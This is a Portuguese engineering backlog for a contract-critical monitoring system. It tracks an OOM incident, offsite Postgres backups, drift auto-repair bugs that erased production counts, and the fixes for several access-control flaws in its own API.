# BACKLOG — Ordem estrita, do mais crítico ao menos crítico

> **Regra de ouro:** só trabalhe no próximo item pendente do topo. Não pule.
> Prioridades foram calibradas contra o **contrato Engelmig × EDP** (6 dígitos ×
> 60 meses, iniciado julho/2026 — infraestrutura crítica de negócio).
>
> **Como ler cada item:**
> - **Categoria** — Governança, Segurança, Dados, Ops, Frontend, Backend, Qualidade
> - **Evidência** — file:line que confirma o problema (valide com Read/Grep antes)
> - **Impacto** — o que acontece se ninguém fizer
> - **Ação** — passos concretos
> - **Aceite** — checkboxes que definem "pronto"
> - **Esforço** — estimativa (dev humano; AI é mais rápido)
> - **Rollback** — como reverter se der ruim
> - **Depende de** — outros itens que precisam vir antes
> - **Fonte** — auditoria/documento onde foi levantado
>
> **Ao concluir:** mude status para `done`, adicione data + hash do commit, NÃO
> delete o item. Isso vira histórico.

## Índice rápido de status

| # | Item | Categoria | Status |
|---|---|---|---|
| P0-0 | VM sem swap + Postgres sem auto-restart confiável (INCIDENTE 09/07) | Ops/Infra | **script done** (22/07) — falta swap+systemd (TI) e watchdog (P1-1) |
| P0-1 | Continuidade humana (bus factor 1) | Governança | pending |
| P0-2 | Backup offsite (Postgres) | Ops | **local OK (cron ativo)** — falta só offsite (SFTP→OneDrive manual OU rclone) |
| P0-3 | Matemática de agregação sem teste (A/B/C) | Dados/Qualidade | **done** (f8b839b, 08/07) — transação virou P1-11 |
| P0-4 | `enforceTeamRegional` desligado silenciosamente (v=2) | Segurança/Backend | **done** (a8dcbab, 08/07) |
| P0-5 | POST `/metas` quebrado para não-admin | Backend | **done** (a8dcbab, 08/07) |
| P0-6 | Auto-reparo do drift APAGAVA produção legítima toda noite (07-22 perdeu 172 OS) | Dados | **done** (25/07 código; 31/07 histórico re-consolidado no apply de julho) |
| P0-7 | Auto-reparo do drift ainda podia SUBTRAIR (drift negativo) — 375 OS iriam sumir no sweep de 31/07 | Dados | **done** (31/07) — reparo monotônico + rota manual corrigida; causa-raiz era o P1-16 |
| P1-1 | Alerta ativo (watchdog + Teams) | Ops | **script done** (e4dc4c8) — falta config humana (webhook+crontab) |
| P1-2 | `/health` real (mover antes de catch-all + SELECT 1) | Ops | **done** (bbc5129, 08/07) |
| P1-3 | `snapshot_last_ok` em `app_settings` | Ops | **done** (e4dc4c8, 08/07) |
| P1-4 | SSRF em `/api/wpa/probe` vaza token EDP | Segurança | **done** (bbc5129, 08/07) |
| P1-5 | Rate limit em `/auth/login` + scrypt | Segurança | **código done** (fa62e12) — falta migrar `.env` de prod pra scrypt |
| P1-6 | Git hook `pre-push` roda `node --test` | Qualidade | **done** (e4dc4c8, 08/07) |
| P1-7 | Retry natural pra MD/SF/rejeições | Dados | **done** (4a8e369, 08/07) — subcat MD/SF/DD; rejeições ver nota |
| P1-8 | ~~`consolidateDay` transacional~~ (duplicata de P1-11) | Dados | — ver P1-11 |
| P1-9 | Vendorizar Leaflet + fonte Roboto | Frontend | **done** (c62bf4a, 08/07) |
| P1-10 | Remover vazamento de stack trace | Segurança | **done** (bbc5129, 08/07) |
| P1-11 | `consolidateDay` transacional (rebaixado de P0-3) | Dados | pending (requer staging) |
| P1-12 | Vazamento regional em 7 rotas que ignoravam `req.scope.regionals` | Segurança | **done** (14/07) |
| P1-13 | `_acc` em memória não sobrevive a restart → produção subnotifica em dia de deploy | Dados | **código done** — falta re-consolidar histórico (dry-run mede) |
| P1-14 | Reconexão vira-noite parte a produção do turno em 2 dias (relogin cruza meia-noite) | Dados | **Fases 1+2 código done** (30/07) — falta SÓ re-consolidar histórico (dry-run→revisar→aplicar) |
| P1-15 | Regra rejeitada>concluída aplicada de forma INCONSISTENTE (depende de quando a rejeição foi coletada) | Dados | fix no ar (0ce0a73) + julho re-consolidado 31/07 (−88 OS) · jun/mai pendentes |
| P1-16 | Exclusão de rejeitada casava pelo dia da SESSÃO → nota rejeitada na sexta voltava a contar como produção | Dados | **done** (31/07) — julho re-consolidado e verificado; jun/mai pendentes |
| P1-17 | Junho mede +717 (+5,5%) na re-consolidação — sinal INVERTIDO e errático; NÃO aplicar sem investigar | Dados | pending — investigação |
| P1-18 | `/settings/:key` lia/gravava QUALQUER chave de app_settings só com auth (escalonamento + IDOR) | Segurança | **done** (13/08) — rota restrita à `monitor-filters:<próprio-user>`; 9 testes |
| P1-19 | Aba Histórico travava a regional pra admin (usava `currentRegional`, não `userRegionals`) | Frontend | **done** (13/08, 5e2c17a) — restringia, não vazava |
| P1-20 | Login WPA sem circuit breaker → retry em credencial inválida TRAVA a conta na EDP (incidente 13/08 18h) | Ops/Backend | **código done** (13/08) — breaker por conta + 13 testes; senha do `.env` é ação humana |
| P2-13 | Upsert de dia antigo sobrescreve com visão parcial → subconta ~0,8% | Dados | pending (conservador, dentro do limiar) |
| P2-1 | Testes de contrato de rota (login, scope, health) | Qualidade | **done** (22/07) |
| P2-2 | Extrair matemática de buckets em módulo único | Dados | **done** (22/07) |
| P2-3 | `public/` dedicado (parar de servir raiz do repo) | Segurança/Frontend | **done** (22/07) |
| P2-4 | Escapar dados EDP em `innerHTML` (XSS) | Segurança | **done** (22/07) |
| P2-5 | Tie-breaker `.order('id')` em queries paginadas | Dados | **done** (22/07) |
| P2-6 | `statement_timeout` no pool Postgres | Dados | **done** (22/07) |
| P2-7 | `pg_dump --schema-only` commitado + schema drift | Ops/Dados | **done** (22/07) |
| P2-8 | Extrair CSS pra `css/app.css` (primeiro passo do split) | Frontend | **done** (22/07) — falta validação visual sua |
| P2-9 | Watchdog externo (UptimeRobot/BetterStack) | Ops | pending |
| P2-10 | Persistir estado do `_reclassifyJob` | Backend | **done** (22/07) |
| P2-11 | Andamento por equipe contava nota já concluída (dupla contagem) | Frontend/Dados | **done** (fc2170d, 09/07) |
| P2-12 | Coluna DIAS/MÉDIA dos Gráficos contava linhas (Date-objeto no Set), não dias | Dados | **done** (28/07) — só leitura, sem re-consolidação |
| P3-1 | Dividir `routes/index.js` por domínio | Backend | pending |
| P3-2 | Split incremental do `index.html` (JS por aba) | Frontend | pending |
| P3-3 | Error handler central do Express | Backend | pending |
| P3-4 | Serialização temporal do cron (consolidate vs upsert) | Backend | pending |
| P3-5 | Cap de range em endpoints de histórico (evitar OOM) | Dados | pending |
| P3-6 | Índice de expressão em `note_details` | Dados | pending |
| P3-7 | `pg_advisory_xact_lock` no `pushTeams` | Dados | pending |
| P3-8 | Remover código morto Vercel/Supabase-remote | Backend | **done** (22/07) — junto com Fase 4 |
| P3-9 | Constantes duplicadas (SETORES, ENGELMIG_ID) em módulo único | Backend | pending |
| P3-10 | Acessibilidade básica (role, aria, tabindex) | Frontend | pending |
| P3-11 | "Andamento" ao vivo retém notas transferidas/canceladas (acc) | Dados/Frontend | **done** (22/07) |

---

# P0 — Existencial (fazer nas próximas 2 semanas)

## P0-0 — VM sem swap + Postgres sem auto-restart confiável

- **Categoria:** Ops / Infra
- **Status:** pending
- **Fonte:** INCIDENTE de 09/07/2026 (Postgres caiu em produção).
- **Evidência:** `free -h` mostra `Swap: 0B`. Cluster Postgres é de sistema
  (`pg_lsclusters`: `16 main ... down`, owner `postgres`, sem sudo pro usr_jose
  iniciar — `sudo pg_ctlcluster` retornou "user usr_jose is not allowed").
- **O que aconteceu (registro do incidente):** um backfill rodado como **60
  processos node paralelos** (loop `for d in $(seq 0 60); do node -e ...`), cada
  um abrindo um pool pg (~10 conexões), estourou memória/conexões numa VM de
  3.8GB **sem swap**. O Postgres foi derrubado (OOM). Ficou `down` por ~2min até
  o systemd reerguer sozinho. Durante a janela, o painel ficou `db:error`
  (produção sem dados). Recuperou 100% após o auto-restart + `pm2 restart` +
  re-consolidação do histórico. **Se o dev não estivesse online, teria ficado
  fora até alguém perceber** — exatamente o risco do P0-1.
- **Impacto:** VM sem swap = qualquer pico de memória mata processos direto,
  sem margem. Postgres é o único estado do sistema; se cair e não reerguer,
  o contrato EDP fica sem reporte. O auto-restart funcionou desta vez, mas com
  delay e sem garantia — e ninguém foi alertado (o watchdog do P1-1 ainda não
  está com a config humana feita).
- **Ação (precisa da TI da Engelmig — não é código):**
  1. **Adicionar swap na VM** (2-4GB). Sem sudo o usr_jose não cria swap de
     sistema; pedir à TI: `fallocate -l 4G /swapfile && mkswap && swapon` +
     entrada no `/etc/fstab`. Dá margem contra OOM.
  2. **Garantir auto-restart do Postgres**: confirmar que
     `postgresql@16-main.service` tem `Restart=on-failure` e
     `RestartSec` baixo. Pedir à TI.
  3. **Watchdog alertar em `db:error`** (liga com P1-1): o `/health` já
     retorna `db:error` quando o Postgres cai — o watchdog (quando configurado)
     deve disparar alerta imediato nesse caso, não só em snapshot velho.
  4. **Disciplina de backfill** (código/processo): NUNCA rodar backfill em N
     processos. Sempre 1 processo, sequencial, com pausa. Já documentado no
     RUNBOOK; considerar criar `scripts/backfill-consolidate.js` oficial pra
     não improvisar `node -e` em loop de shell.
- **Aceite:**
  - [ ] `free -h` mostra swap > 0 na VM. *(TI — pendente)*
  - [ ] `systemctl show postgresql@16-main -p Restart` = `on-failure`. *(TI — pendente)*
  - [ ] Watchdog dispara alerta quando `/health` retorna `db:error`. *(liga com P1-1 — config humana pendente)*
  - [x] `scripts/backfill-consolidate.js` existe (1 processo, pausa entre dias). **(done 22/07)**
- **Esforço:** swap + auto-restart = pedido à TI (minutos deles). Script de
  backfill = 1h. Watchdog db:error = incluído no P1-1.
- **Rollback:** N/A (adições de infra/config).
- **Depende de:** acesso da TI da Engelmig (swap/systemd exigem root).
- **Status:** **pending** — o item de CÓDIGO (aceite #4) está feito em
  22/07/2026; os outros 3 aceites dependem da TI da Engelmig (swap/systemd =
  root) e da config humana do watchdog (P1-1). Não dá pra fechar por código.
- **Feito em (parcial, 22/07/2026):** criado `scripts/backfill-consolidate.js`
  — runner oficial de (re)consolidação, single-process e sequencial com pausa,
  dry-run por padrão + `--apply`. Mata a causa raiz do incidente por
  construção: pega um **advisory lock do Postgres** (`pg_try_advisory_lock`) no
  início e RECUSA uma 2ª cópia concorrente (o incidente foram ~60 processos
  node paralelos). O lock é por sessão → solta sozinho se o processo morrer.
  RUNBOOK atualizado pra usar o script (em vez do `node -e` em loop). +10
  testes (`parseArgs`/`rangeDatas`). Suíte 246/246.

## P0-1 — Continuidade humana (bus factor 1)

- **Categoria:** Governança / Operação
- **Status:** pending
- **Fonte:** CTO review 2026-07-08
- **Evidência:** José Zouain é único conhecedor de: senha `wpa_app`
  (SUPERUSER Postgres), conteúdo do `.env` da VM, credenciais Cloudflare
  Worker, credenciais WPA da EDP em `AUTH_USERS`, senha `usr_jose` na VM,
  IP `172.25.3.154` autorizado na EDP. `CHECKPOINT.md:43` documenta
  "senha do wpa_app conhecida só pelo usr_jose".
- **Impacto:** Contrato EDP em risco imediato se José ficar 2+ semanas
  indisponível (doença, luto, oferta, esgotamento). Probabilidade em 60
  meses ≈ 100%. Consequência: reporte diário não sai, EDP questiona, contrato
  pode ser rescindido com penalidades.
- **Ação:**
  1. Escrever `docs/handoff/RUNBOOK.md` de 1-2 páginas cobrindo: como
     reiniciar cron/PM2, como restaurar backup, quem contatar na EDP se der
     problema, como atualizar `AUTH_USERS`, onde ficam as senhas (referência,
     não conteúdo).
  2. Configurar cofre compartilhado (Bitwarden Business ~R$15/user/mês, ou
     KeePass num OneDrive corporativo). Guardar: `.env` completo, senha
     Postgres, credenciais Cloudflare Worker, senha `usr_jose`, credenciais
     WPA EDP, endereço IP autorizado EDP.
  3. Compartilhar leitura com **pelo menos 2 pessoas** (1 da TI da Engelmig,
     1 da diretoria).
  4. Registrar formalmente à diretoria da Engelmig: "sistema que sustenta
     contrato R$X vive em 1 dev. Reforço humano necessário em 90 dias."
     (email ou ata registrado).
- **Aceite:**
  - [ ] `docs/handoff/RUNBOOK.md` existe e cobre os 5 pontos acima.
  - [ ] Cofre criado, credenciais dentro, testado com login pelas 2 pessoas
    adicionais.
  - [ ] Simulação seca: pessoa que nunca tocou o sistema segue o runbook e
    consegue reiniciar tudo (com apoio remoto, mas sem intervenção do José).
  - [ ] Email registrado com a diretoria pedindo reforço formal.
- **Esforço:** 1-2 dias (roteiro humano, não código).
- **Rollback:** N/A — só adição de docs e config de cofre externo.
- **Depende de:** nada.
- **Bloqueia:** todos os outros (pré-requisito emocional de "posso mexer
  sem medo de eu ser o único que sabe").

## P0-2 — Backup offsite do Postgres

- **Categoria:** Operação
- **Status:** **CÓDIGO+DOC done** (22/07/2026) — `scripts/backup-wpa-monitor.sh`
  ganhou a etapa offsite (rclone copy → `onedrive:wpa-backups/` após verificação
  de integridade, + retenção offsite 30d), opt-in com degradação segura (sem
  rclone configurado, segue backup local sem quebrar). Setup passo a passo (install
  sem sudo + OAuth headless do OneDrive + crontab + teste de restore) documentado
  no RUNBOOK.md ("Backup offsite (P0-2)"). **REALIDADE constatada 22/07:** o backup
  LOCAL já rodava automático (cron 03:01, 15 dumps presentes Jul 8→22, ~600M/dia,
  integridade OK, retenção 14d) — a camada mais crítica já estava de pé. **FALTA só
  o OFFSITE.** Caminho leve escolhido: **SFTP→OneDrive manual** (arrastar o dump mais
  recente ~1×/semana; sem rclone). O rclone (automação) ficou opcional/adiado — o
  OAuth headless travou o José (precisa de rclone no Windows). Atenção disco: 8.1G
  em backups; se apertar, baixar RETENTION_DAYS pra 7.
- **Fonte:** CTO review 2026-07-08; auditoria de operação
- **Evidência:** `scripts/backup-wpa-monitor.sh:30` — `BACKUP_DIR=$HOME/backups/wpa_monitor`
  na própria VM. `POSTGRES-MIGRATION.md:262` até reconhece "copie os backups
  pra fora do servidor... não é backup" mas nenhum script implementa.
- **Impacto:** VM ou disco morre → banco + backups desaparecem juntos.
  Histórico operacional desde abril/2026 é irreconstituível (API WPA só
  devolve estado ao vivo). 60 meses de contrato dependendo desse banco.
- **Ação:**
  1. Instalar `rclone` no usuário (sem sudo — binário single-file em
     `~/bin/rclone`).
  2. Configurar `rclone` com OneDrive corporativo do José (M365 já disponível
     via conta @engelmig.com.br; Fortinet libera outbound Microsoft).
  3. Adicionar etapa final em `scripts/backup-wpa-monitor.sh` que faz
     `rclone copy $LATEST_DUMP onedrive:wpa-backups/` após verificação de
     integridade.
  4. Configurar retenção offsite (30 dias) via `rclone --min-age 30d --delete`.
  5. Testar restore uma vez com o dump offsite.
- **Aceite:**
  - [ ] `rclone version` roda no usuário sem sudo.
  - [ ] `rclone lsd onedrive:` lista pastas do OneDrive corporativo.
  - [ ] Backup diário grava também em `onedrive:wpa-backups/YYYY-MM-DD.dump`.
  - [ ] Restore testado: baixar dump do OneDrive + `pg_restore` num banco
    `wpa_monitor_test` funciona.
  - [ ] Aceite documentado em `RUNBOOK.md`.
- **Esforço:** meio dia.
- **Rollback:** Remover a etapa `rclone` do script. Banco continua sendo
  backupado localmente.
- **Depende de:** conta OneDrive corporativa com espaço suficiente
  (~500MB × 30 dias = ~15GB, cabe no M365 padrão).
- **Bloqueia:** nada, mas P0-1 fica incompleto sem isso.

## P0-3 — Matemática de agregação sem teste + `consolidateDay` não-atômico

- **Categoria:** Dados / Qualidade
- **Status:** pending
- **Fonte:** Auditoria de qualidade + auditoria de pipeline (2026-07-08)
- **Evidência:**
  - `services/dataService.js:_buildDiaSummary()` (linhas 226-362) — sem teste
    nenhum. Já produziu bug canc=904/294 documentado no próprio código
    (`dataService.js:313-317`).
  - `services/dataWriter.js:consolidateDay()` (linhas 371-455) — faz `DELETE`
    de `team_daily_totals` D e D-1 seguido de reagregação **sem transação**.
    Crash entre DELETE e INSERT zera o dia.
  - `services/dataWriter.js:_notaDate()` e `:_sessionDate()` (linhas 137-188)
    — regra de negócio central sem teste. Se quebrar, todos os agregados
    quebram silenciosamente.
  - Drift-sweep só cobre D-1 e D-7 (`cronService.js:975-985`). D-2 a D-6
    ficam órfãos se zerarem.
- **Impacto:** Números que aparecem no painel podem estar errados. Se EDP
  auditar 60 meses de reporte e encontrar divergência num dia qualquer,
  contrato marca. Já aconteceu de gerar valor absurdo (904 vs 294) — foi
  detectado no olho; próxima vez pode passar.
- **Ação:**
  1. Criar `test/dataSummary.test.js` que usa `pgShim._setPool()` (infra
     em `test/pgShim.test.js`) pra injetar pool fake respondendo às 3
     queries de `_buildDiaSummary` (first/last/rejections) com fixtures
     pequenas.
  2. Cobrir:
     - UUID em 2 buckets → conta 1× no de maior prioridade
     - UUID no 1º snap que some → cancelada
     - UUID só no último snap → entrada_nova
     - Invariante `inicial + entradas_novas = atual + andamento + concluidas
       + rejeitadas + canceladas` verificada com `assert`
     - Caso do bug 904/294 replicado
  3. Exportar `_notaDate` e `_sessionDate` em `dataWriter.js:module.exports`
     e criar `test/notaDate.test.js` com casos: `conclusionDate` < sessDate
     → dia anterior; vira-noite mantém sessDate; formato inválido → null.
  4. **Refatorar `consolidateDay` pra transação atômica**: usar `_getPool()`
     direto pra `BEGIN`/`DELETE`/`INSERT`/`COMMIT` num único client. Se
     qualquer passo falhar, `ROLLBACK` — dia continua com dado antigo em
     vez de zerado.
  5. Estender `runDailyDriftSweep` pra rodar `detectDrift` em D-1..D-7 (loop
     de 7 chamadas baratas) em vez de só D-1 e D-7.
- **Aceite:**
  - [ ] `test/dataSummary.test.js` roda com 5+ casos, todos passam.
  - [ ] `test/notaDate.test.js` roda com 6+ casos, todos passam.
  - [ ] `consolidateDay` envolve DELETE+INSERT em `BEGIN/COMMIT` com
    `ROLLBACK` em erro.
  - [ ] Drift-sweep cobre D-1 até D-7 (validar em log de próxima 02:00 BRT
    após deploy).
  - [ ] `node --test` sobe de 152 → 165+ testes verdes.
- **Esforço:** 2-3 dias.
- **Rollback:** Reverter o commit da transação (funções puras nos testes
  não têm efeito colateral). Não deixe deployado se testes falharem.
- **Depende de:** P0-1 (pra você poder pedir revisão de outro dev/AI antes
  de deployar mudança destrutiva).
- **Bloqueia:** P3-4 (serialização do cron precisa dessas garantias antes).

## P0-4 — `enforceTeamRegional` desligado silenciosamente

- **Categoria:** Segurança / Backend
- **Status:** pending
- **Fonte:** Auditoria de backend + segurança 2026-07-08
- **Evidência:** `routes/index.js:183` — `if (!req.user || !req.user.regional) return true;`
  O payload v=2 (post-refactor #33) só tem `req.user.regionals` (array).
  `req.user.regional` (singular) é sempre `undefined`. Logo `enforceTeamRegional`
  **sempre retorna `true`** no primeiro branch, e o 403 (linhas 196-201) é
  inalcançável nas 6 rotas que chamam essa função:
  `/totais/subcat`, `/performance/equipes`, `/historico/sessoes`,
  `/historico/equipes`, `/equipes/producao`, `/mapa/equipe`.
- **Impacto:** Defesa em profundidade morta. Um usuário da regional GUA
  passando `?team=ETSJC01` (equipe de SJC) hoje **não é bloqueado por essa
  função**. O `applyScope` ainda intersecta o `regionals`, mas rotas que
  aceitam `?team=` direto passam. Vazamento potencial entre regionais.
- **Ação:**
  1. Ler `routes/index.js:181-206` inteiro.
  2. Substituir `if (!req.user || !req.user.regional) return true;` por
     `if (!req.user || !Array.isArray(req.user.regionals) || req.user.regionals.length === 0) return true;`
  3. Ajustar a lógica interna pra usar `req.user.regionals.includes(teamRegional)`
     em vez da checagem singular.
  4. Adicionar caso em `test/auth.test.js`: user com `regionals: ['GUA']`
     tentando acessar equipe de SJC → 403.
- **Aceite:**
  - [ ] `enforceTeamRegional` usa `req.user.regionals` (array).
  - [ ] Novo teste em `test/auth.test.js` cobre o caso, passa.
  - [ ] `grep -n "req\.user\.regional[^s]" routes/ middleware/ services/`
    retorna zero (garante que não ficou vestígio singular).
- **Esforço:** 1h.
- **Rollback:** Reverter o commit. A guarda estava morta antes, continua morta.
- **Depende de:** P1-6 (git hook pre-push) recomendável antes.

## P0-5 — POST `/metas` quebrado pra não-admin (mesmo bug de P0-4)

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:311` — `const userReg = req.user.regional;`
  → `userReg` sempre `undefined`. Linha 322 retorna 403 "Conta sem regional
  vinculada" pra **qualquer usuário não-admin** tentando salvar metas.
  Ironicamente, as linhas 325-330 já usam `req.user.regionals` corretamente
  — só a checagem inicial está errada.
- **Impacto:** Usuários regionais (GUA, CAC, SJC) não conseguem editar
  metas de suas equipes. Funcionalidade regressa desde refactor #33.
- **Ação:**
  1. `routes/index.js:311` — trocar `req.user.regional` por `req.user.regionals`.
  2. Ajustar a lógica de checagem (linhas 313-322) pra usar array (verificar
     se algum item do `regionals` está em `REGIONAIS_VALIDAS`).
  3. Adicionar teste em `test/auth.test.js`: user `guarapari` faz POST
     `/api/metas` → 200 (ou 401 se não passar auth por outra razão, mas
     não 403 "sem regional").
- **Aceite:**
  - [ ] Bug corrigido, teste passa.
  - [ ] Usuário `guarapari` consegue salvar metas via UI (validação manual
    pós-deploy).
- **Esforço:** 30min.
- **Rollback:** Reverter o commit. Regressão volta.
- **Depende de:** nada.

## P0-6 — Auto-reparo do drift APAGAVA produção legítima toda noite

- **Categoria:** Dados
- **Status:** **código done** (25/07) — falta re-consolidar os dias já danificados
- **Fonte:** Validação do efeito colateral do CS (+1571 de julho), 25/07/2026.
  Ferramenta: `scripts/diag-drift-team.js`.
- **Evidência:**
  - Assimetria de janela: `consolidateDay(X)` monta equipes com sessão em
    `{X-1, X}` (`dataWriter.js:_unionTeamsFromSnapshots`) mas **wipa** `{X-1, X}`
    (`dataWriter.js` — `datesToWipe`). Logo quem grava o valor COMPLETO de um dia
    D é o passe de **D+1**: a janela dele inclui as sessões da manhã seguinte, que
    carregam notas concluídas em D por equipe que relogou (`_notaDate` devolve a
    nota pro dia da conclusão quando `conclusionDate < sessDate`).
  - `detectDrift(D)` usava como régua o passe de **D** — que não vê essas sessões
    → subcontava ~6% e acusava a tabela de "inflada". O `runDriftCheck` então
    rodava `consolidateDay(D)`, gravando o valor INCOMPLETO. Auto-reparo destrutivo.
  - Medido no **07-13** (fora da janela do sweep, portanto intacto):
    gravado **903**, passe de D+1 **904**, passe de D **850**. As 21 equipes com
    gap batiam **1:1** com o passe de D+1 (ex.: ECCSJ80 13 gravado = 13 por D+1,
    contra 2 pela régua de D).
  - Dano já consumado no **07-22**: era **1161**, o sweep das 02:00 de 25/07
    "reparou" pra **989** — **−172 OS reais perdidas**.
  - Agravante: `runDailyDriftSweep` varria D-1→D-7 (ordem decrescente), então o
    reparo de um dia estragava o dia seguinte já corrigido — nunca convergia.
- **Impacto:** **Subnotificação silenciosa e recorrente de produção reportável à
  EDP**, atingindo os últimos 7 dias a cada 02:00. Pior classe de bug do projeto:
  o "monitor de integridade" era a própria fonte da corrupção, e o número caía
  sozinho depois de já ter sido reportado. Explica por que o resíduo de julho
  parecia "tabela inflada" — era o contrário.
- **Ação:**
  1. ✅ `detectDrift` passa a usar a régua do write-path: dryRun de **D+1**
     recortado por `r.date === date`. Expõe `repair_date` (= D+1).
  2. ✅ `runDriftCheck` repara via `consolidateDay(report.repair_date)`, não
     `consolidateDay(date)`.
  3. ✅ `runDailyDriftSweep` varre em ordem **crescente** (D-7 → D-1), pra cada
     iteração consertar o colateral da anterior. Só HOJE sobra incompleto —
     coberto pela consolidação das 20:30, pelo cron intraday e pelo sweep de amanhã.
  4. ✅ `_addDays` extraído como helper puro + `test/driftWindow.test.js` (6 casos)
     travando a invariante `passe D+1 >= passe D` e o dedup por UUID (o risco do
     fix seria a janela mais larga inflar — travado por teste).
  5. ⬜ **Re-consolidar os dias danificados** (janela dos sweeps de 24 e 25/07,
     ≈ 07-17..07-24): `node scripts/backfill-consolidate.js 2026-07-17 2026-07-24 --apply`.
     Com o fix no ar o sweep também restaura sozinho, mas conferir é mais rápido.
- **Aceite:**
  - [x] `node --test` 268 → 274 verdes.
  - [x] `diag-drift-team.js` no 07-13 dá veredito "HIPÓTESE CONFIRMADA".
  - [ ] Após deploy: `diag-drift-team.js 2026-07-22` volta a ~1161 (hoje 989).
  - [ ] Log do próximo sweep das 02:00 sem `drift_detected` em cascata nos 7 dias.
- **Esforço:** fix 2h (feito). Re-consolidação ~10min.
- **Rollback:** Reverter o commit do fix. ⚠️ Reverter **devolve** o auto-reparo
  destrutivo — se precisar reverter, desligue o sweep das 02:00 junto.
- **Depende de:** nada. **Relacionado:** P1-13 (a união que criou a assimetria),
  P1-11 (transação — um crash no meio do reparo ainda zera o dia).
- **31/07/2026:** item 5 resolvido junto com o apply de julho (P1-15) — os dias
  17→24/07 voltaram pra cima (21/07 +6, 24/07 +7, 25/07 +6). E a investigação
  revelou que o fix estava **incompleto**: ver **P0-7**.

---

## P0-7 — Auto-reparo do drift ainda podia SUBTRAIR produção

- **Categoria:** Dados
- **Status:** **done** (31/07/2026)
- **Fonte:** `scripts/verify-consolidacao.js` rodado logo após o apply de julho.
- **Evidência:** 5 dias com drift acima do limiar, **todos negativos** (tabela
  MAIOR que a régua de D+1), e **4 dos 5 são sexta-feira**:

  | dia | tabela | régua D+1 | diff | limiar |
  |---|---|---|---|---|
  | 03/07 (sex) | 888 | 832 | −56 | 17 |
  | 08/07 (qua) | 980 | 958 | −22 | 19 |
  | 10/07 (sex) | 885 | 789 | −96 | 16 |
  | 17/07 (sex) | 1076 | 959 | −117 | 19 |
  | 24/07 (sex) | 959 | 875 | −84 | 18 |

  - **Não é corrupção — é acúmulo legítimo.** `consolidateDay(X)` apaga só
    `{X-1, X}`, mas faz upsert de linhas pra **vários notaDate anteriores** (nota
    concluída na sexta segue no payload das sessões de sábado e segunda). Nos logs
    do apply de 31/07 o passe de 05/07 gravou
    `dates ["2026-07-03","2026-07-04","2026-07-05"]` **sem wipar 03/07**. Logo o
    valor gravado de um dia antigo é mais COMPLETO que o de qualquer passe
    isolado, e a diferença é maior nas sextas — cuja produção continua a aparecer
    no fim de semana e na segunda.
- **Impacto:** o sweep das 02:00 de 31/07 iria "reparar" o 24/07 (dentro da
  janela D-7) e **destruir 84 OS**. Nos 5 dias, **375 OS**. É o P0-6 outra vez,
  um nível mais fundo: lá a régua era D, aqui é D+1 e ainda subconta. Alargar a
  régua indefinidamente não resolve — sempre existe um passe posterior.
- **Ação:**
  1. ✅ `shouldAutoRepair(report)` em `dataWriter.js` — decisão pura: repara só
     quando `diff > 0` (falta produção). Drift negativo → `drift_nao_reparado` +
     `drift_last_skip` em `app_settings`, sem tocar em dado. **Reparo monotônico:
     só ADICIONA, nunca subtrai.**
  2. ✅ `runDriftCheck` consulta a decisão antes de consolidar.
  3. ✅ `POST /api/admin/drift/repair` corrigido — ficou 6 dias com os DOIS
     defeitos que o P0-6 já havia corrigido no cron: rodava `consolidateDay(date)`
     (régua de D) e reparava com drift negativo. Agora usa `repair_date`, respeita
     o guard e exige `?force=1` pra sobrescrever.
  4. ✅ `test/driftRepairGuard.test.js` (8 casos), incluindo os 5 dias reais e a
     soma de 375 OS que o sweep destruiria.
- **Aceite:**
  - [x] `node --test` 336 → 343 verdes.
  - [ ] Log do sweep de 01/08 às 02:00: `drift_nao_reparado` nesses dias, e
        `verify-consolidacao.js` mostrando os mesmos números do dia anterior.
- **Esforço:** 1h (feito).
- **Rollback:** reverter o commit. ⚠️ Devolve o reparo destrutivo.
- **✅ CAUSA-RAIZ ENCONTRADA no mesmo dia: era o P1-16.** A hipótese de "acúmulo
  legítimo" estava ERRADA — o que a tabela tinha a mais era **nota rejeitada
  re-somada** pelos passes dos dias seguintes (a exclusão casava pelo dia da
  SESSÃO, não da NOTA). Depois do fix do P1-16 + re-consolidação de julho, as
  quatro sextas passaram de −56 / −96 / −117 / −84 para **+2 / +3 / +2 / +4**, e
  os 31 dias ficaram `ok`. A régua de D+1 SEMPRE foi suficiente; o problema era o
  dado. **Não há necessidade de alargar a régua pra D+1..D+3.**
  - O guard continua valendo como rede de segurança — um reparo automático que
    pode subtrair é perigoso independentemente desta causa específica.

---

# P1 — Alta prioridade (4 semanas)

## P1-18 — `/settings/:key` sem guarda de dono/role (escalonamento + IDOR)

- **Categoria:** Segurança (controle de acesso)
- **Status:** **done** (13/08/2026)
- **Fonte:** investigação da persistência de filtros, disparada por um susto do
  admin não ver outras regionais na Histórico (que era o **P1-19**, não este).
- **Evidência:** `GET`/`PUT /api/settings/:key` (`routes/index.js`) só passavam por
  `authMiddleware` — sem checar dono nem role. `app_settings` é COMPARTILHADA e
  guarda estado operacional que tem rotas dedicadas protegidas:
  - `metas_diarias` — a rota dedicada valida regional por conta (não-admin só
    escreve a própria); a genérica deixava **qualquer conta sobrescrever as metas
    de todas as regionais**.
  - `contador-transgressao` e `desloc-threshold` — `requireAdmin` nas dedicadas,
    reabertos sem guarda.
  - `snapshot_last_ok` / `snapshot_error` / `subcat_error` / `drift_last_*` —
    escritos só pelo cron; qualquer conta podia forjar "cron saudável" e cegar o
    watchdog.
  - `monitor-filters:<outro-user>` — IDOR: ler ou sobrescrever o filtro alheio.
  - **Não** era vazamento de dado operacional (o `applyScope` das rotas de dados
    seguia firme) — era escrita indevida em estado de configuração + IDOR.
- **Fix:** a rota passa a servir SÓ a preferência do próprio usuário —
  `monitor-filters:<username-do-token>`. Qualquer outra chave → `403`
  (`code: SETTINGS_SCOPE`). Helpers `_ownSettingsKey` / `_assertOwnSettingsKey`.
  O front nunca usou outra chave (confirmado: só `_filtersKey()`), então não
  quebra nada. Estado operacional continua só nas rotas dedicadas.
- **Teste:** `test/settingsScope.test.js` (9 casos) — própria chave passa, chave
  de outro user 403, metas/cron/contador 403 até pra admin, sem-token 401.
  Suíte 357 → 366.
- **Aceite:** [x] testes verdes · [ ] após deploy, tentar `PUT
  /api/settings/metas_diarias` com token não-admin e ver 403.
- **Esforço:** 1h (feito). **Rollback:** reverter o commit (reabre o buraco).
- **Relacionado:** P0-4, P1-12 (mesma família de controle de acesso), P1-19.

## P1-19 — Aba Histórico travava a regional pra admin

- **Categoria:** Frontend (correção; NÃO é vazamento)
- **Status:** **done** (13/08/2026, commit 5e2c17a)
